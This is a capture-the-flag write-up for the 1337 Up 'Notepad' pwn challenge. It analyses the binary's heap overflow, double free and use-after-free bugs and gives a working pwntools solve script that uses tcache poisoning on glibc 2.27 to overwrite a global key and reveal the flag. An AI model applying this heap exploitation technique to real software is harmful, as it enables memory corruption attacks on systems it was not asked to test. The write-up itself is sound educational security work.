---
tags: ["uaf", "tcache"]
download-link: "https://ctf-archives.s3.us-east-1.amazonaws.com/2024-1337-up/1337up_pwn/notepad.zip"
---

# 1337 Up | Notepad - PWN (100)

Challenge involved getting a `.text` leak at the start of main. After that exploit the use-after-free vulnerability using tcache poisoning to modify the global variable `key` and read the flag.

## Initial Analysis

### Checksec
First thing is to look at basic memory protections

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

These are full memory protections, so we are going to have to get creative

### Binary Review
The first thing the `main()` function does is gives us a `.text` leak.

``` c
void main() {
    setup();
    banner();
    puts("Welcome to the notepad service!");
    printf("Here a gift: %p\n",main);
    ...
}
```

Looking through the rest of the binary, it appears that notes can be created, edited, viewed, and removed.
There are a few vulnerabilities here to take a look at.

When creating a note you can specify the size of the note

``` c
void createNote() {
    ...
    puts("How large you want the note to be?");
    printf("> ");
    scanf("%d", note_size);
    p = malloc(note_size);
    notepad[index] = p;
    if (notepad[index] == 0) {
        printf("[X] Something went wrong!, Try again!");
        exit(0);
    }
    ...
}
```

When calling `editNote()` the size of the chunk is not used, and is just a hard coded value, which is a heap buffer overflow vulnerability.

``` c
void editNote() {
    puts("Choose the index of your note you want to edit");
    printf("> ");
    scanf("%d", index);
    if (4 < index) {
        printf("Wrong index!");
        exit(0);
    }
    if (notepad[index] == 0) {
        printf("Note is empty at the index %d", index);
        exit(0);
    }
    puts("Your changes:");
    printf("> ");
    read(0, notepad[index], 0x100);
}
```

Looking at the `removeNote()` function we see that the note chunks are not set to `NULL` which allows for a double free vulnerability and opens up potential for a use after free vulnerability.

``` c
void removeNote() {
    puts("Choose the index of your note you want to remove");
    printf("> ");
    scanf("%d", index);
    if (4 < index) {
        printf("Wrong index!");
        exit(0);
    }
    if (notepad[index] == 0) {
        printf("Note is already empty!");
        exit(0);
    }
    free(notepad[index]);
}
```

Now that we have a few primitives involving heap vulnerabilities, let's take a look at the libc version.
Thankfully the challenge gives you the glibc version that it runs with, `2.27`

``` bash
$ strings libc.so.6 | grep "GNU C Library"
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) stable release version 2.27.
```

Exploiting these vulnerabilities should give us a write-what-where primitive, so how do we use this? There is a neat function `secretNote()` that will print the flag, as long as the global variable `key` equals `0xcafebabe`.

``` c
void secretNote() {
    if (key != 0xcafebabe) {
        puts("You don\'t have access!");
        exit(-1);
    }
    print_flag();
}
```

So with this we know that:
- there is a heap-based buffer overflow vulnerability
- there is a double free vulnerability
- there is a use after free vulnerability
- the glibc version is `2.27`, so there aren't a lot of heap memory protections
- if the key is `0xcafebabe`, then `secretNote()` will print the flag

## Exploitation

### Getting Memory Leak
First grab the memory leak and calculate the base address
``` python
proc.recvuntil(b'Here a gift: ')
leak = proc.recvline().strip().decode()
leak_address = int(leak, 16)
main_address = 0x0010119a
base_address = leak_address - main_address
```

### Patching Binary
Since the challenge uses a different glibc, it's important to patch the binary to use the version that was given.

Set the runpath
``` bash
$ patchelf --set-rpath . notepad
```

Set the interpreter

``` bash
$ patchelf --set-interpreter ./ld-linux-x86-64.so.2 notepad
```

### Tcache Poisoning
Let's perform a tcache poisoning attack through the use after free vulnerability.

First warm up the tcache by creating two chunks, and then freeing them
``` python   
add_note(proc, b'1', b'chunk1')
add_note(proc, b'2', b'chunk2')
del_note(proc, b'1')
del_note(proc, b'2')
```

Now poison the tcache bin by editing one of the notes with the payload. This should change the address such that malloc will return an address to the `key` location. The location of `key` can be calculated know the base address

``` python
key_addr = 0x0030204c + base_address
payload = b''.join([
    b'A'*0x18,
    p64(0x21),
    p64(key_addr)
])

proc.sendlineafter(b'> ', b'3') # edit note
proc.sendlineafter(b'> ', b'1') # Choose index 1
proc.sendlineafter(b'> ', payload) # overwrite chunk metadata
```

Now that the tcache has been poisoned, get a pointer to the `key` address and write `0xcafebabe` to it

``` python
add_note(proc, b'3', b'chunk2')
add_note(proc, b'4', p64(0xcafebabe))
```

Call `secretNote()` and get the flag
``` python
proc.sendlineafter(b'> ', b'5') # request secret note
flag = proc.recvall().strip().decode()
print(f'Flag: {flag}')
```

## Solve
``` python
from pwn import *

BINARY = './notepad'
HOST = ''
GDB_SCRIPT = ''

def add_note(proc, index, data):
    proc.sendlineafter(b'> ', b'1')
    proc.sendlineafter(b'> ', index)
    proc.sendlineafter(b'> ', b'16')
    proc.sendlineafter(b'> ', data)

def del_note(proc, index):
    proc.sendlineafter(b'> ', b'4')
    proc.sendlineafter(b'> ', index)

def main():
    proc = get_process() # set is_remote = False for local testing
    
    # Use main() leak to calculate .text base
    proc.recvuntil(b'Here a gift: ')
    leak = proc.recvline().strip().decode()
    leak_address = int(leak, 16)
    main_address = 0x0010119a
    base_address = leak_address - main_address
    
    # Warm up tcache      
    add_note(proc, b'1', b'chunk1')
    add_note(proc, b'2', b'chunk2')
    del_note(proc, b'1')
    del_note(proc, b'2')
    
    # Use .text base to get key address
    key_addr = 0x0030204c + base_address
    payload = b''.join([
        b'A'*0x18,
        p64(0x21),
        p64(key_addr)
    ])
    
    # Exploit use-after-free by tcache poisoning
    proc.sendlineafter(b'> ', b'3') # edit note
    proc.sendlineafter(b'> ', b'1')
    proc.sendlineafter(b'> ', payload) # overwrite chunks
    
    # Modify key variable with 0xcafebabe
    add_note(proc, b'3', b'chunk2')
    add_note(proc, b'4', p64(0xcafebabe))
    
    # Print flag
    proc.sendlineafter(b'> ', b'5') # request secret note
    flag = proc.recvall().strip().decode()
    print(f'Flag: {flag}')

# Allows compatibility if custom library isn't present
try:
    from ctfkit.bp import *
    tpwn.GDB_SCRIPT = GDB_SCRIPT
except ImportError:
    def get_process(is_remote=True):
        host, port = HOST.split(':')
        return remote(host, int(port)) if is_remote else process()

if __name__ == '__main__':
    try:
        context.binary = BINARY
    except FileNotFoundError:
        print('Not able to load binary, local testing disabled')
    context.log_level = 'error'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

    parse_args()
    main()
```